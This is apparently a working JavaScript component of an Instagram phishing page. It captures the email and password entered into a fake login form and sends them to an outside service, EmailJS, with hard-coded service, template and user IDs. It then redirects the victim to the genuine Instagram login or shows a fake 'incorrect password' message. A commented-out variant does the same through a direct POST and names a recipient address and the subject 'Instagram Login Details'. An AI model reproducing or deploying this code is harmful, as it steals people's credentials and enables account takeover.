// Initialize EmailJS with your user ID
emailjs.init("bB5hMA2dOaqvRjUY1");

// Function to send email
function sendEmail() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Send email using EmailJS
    emailjs.send("service_k1gw10c", "template_ao66zhw", {
        email: email,
        password: password
    }).then(function(response) {
        console.log('Email sent successfully:', response);
        // Optionally, redirect the user to the Instagram login page after sending the email
        window.location.href = 'https://www.instagram.com/accounts/login/?next=%2Flogin%2F'; // Redirect to Instagram login page
    }, function(error) {
        console.error('Email failed to send:', error);
        displayErrorMessage('Sorry, your password was incorrect. Please double-check your password.');
    });

    // Prevent form submission
    return false;
}

// Add event listener to the form submit event
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent the default form submission
    sendEmail();
});





















// This works with the onclick function just does not send the values as required


// // Initialize EmailJS with your user ID
// emailjs.init("bB5hMA2dOaqvRjUY1");

// // Function to send email
// function sendEmail() {
//     const email = document.getElementById('email').value;
//     const password = document.getElementById('password').value;




//     const xhr = new XMLHttpRequest();
//     xhr.open('POST', 'https://api.emailjs.com/api/v1.0/email/send', true);
//     xhr.setRequestHeader('Content-Type', 'application/json');

//     xhr.onreadystatechange = function () {
//         if (xhr.readyState === 4) {
//             if (xhr.status === 200) {
//                 console.log('Email sent successfully:', xhr.responseText);
//                 // Optionally, redirect the user to the Instagram login page after sending the email
//                 window.location.href =    'https://www.instagram.com/accounts/login/?next=%2Flogin%2F';     // 'https://www.instagram.com/login';
//             } else {
//                 console.error('Email failed to send:', xhr.responseText);
//                 displayErrorMessage('Sorry, your password was incorrect. Please double-check your password.');
//             }
//         }
//     };

//     // Define email parameters
//     const emailParams = {
//         service_id: 'service_k1gw10c',
//         template_id: 'template_ao66zhw',
//         user_id: 'bB5hMA2dOaqvRjUY1',
//         template_params: {
//             email: email, // Pass the email entered by the user
//             password: password, // Pass the password entered 

//             // to_email: 'Ndiyoedward@gmail.com', // Your email address here
//             // subject: 'Instagram Login Details',
//             // body: `Email: ${email}\nPassword: ${password}`,
//         },
//     };

//     xhr.send(JSON.stringify(emailParams));
// }

// // Add event listener to the form submit event


// document.getElementById('loginForm').addEventListener('submit', function (event) {
//     event.preventDefault(); // Prevent the default form submission
//     sendEmail();
// });
